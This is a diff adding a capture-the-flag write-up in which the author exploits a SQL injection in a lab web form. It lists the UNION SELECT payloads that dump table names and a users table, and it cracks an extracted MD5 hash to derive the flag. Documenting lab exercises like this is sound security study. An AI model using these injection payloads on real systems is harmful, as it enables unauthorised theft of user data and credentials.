@@ -1,0 +1,39 @@
+Injection SQL: if we put a quote (') in the textbox, I have an error => You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\'' at line 1
+
+SELECT command denied to user 'borntosec'@'localhost' for table 'tables'
+
+(SELECT 1+1) => returns result of id=2, it means the query is executed
+
+I found a query to get columns/tables names:
+
+1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns
+
+source: http://www.sqlinjection.net/column-names/
+
+Now i know there is a table `users` with columns user_id|town|planet|country|last_name|first_name|Commentaire|countersign
+
+I will get more information with this query :
+
+`1 UNION SELECT first_name,Commentaire from users`
+
+I get :
+	ID: 1 UNION SELECT first_name,Commentaire from users 
+	First name: Flag
+	Surname : Decrypt this password -> then lower all the char. Sh256 on it and it's good !
+
+	with `1 UNION SELECT first_name,countersign from users`
+
+	I get :
+
+	ID: 1 UNION SELECT first_name,countersign from users 
+	First name: Flag
+	Surname : 5ff9d0165b4f92b14994e5c685cdce28
+
+	5ff9d0165b4f92b14994e5c685cdce28 * md5 reverse => FortyTwo
+
+	FortyTwo * lower = fortytwo
+
+	echo -n fortytwo | shasum -a 256
+
+	flag => 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
+
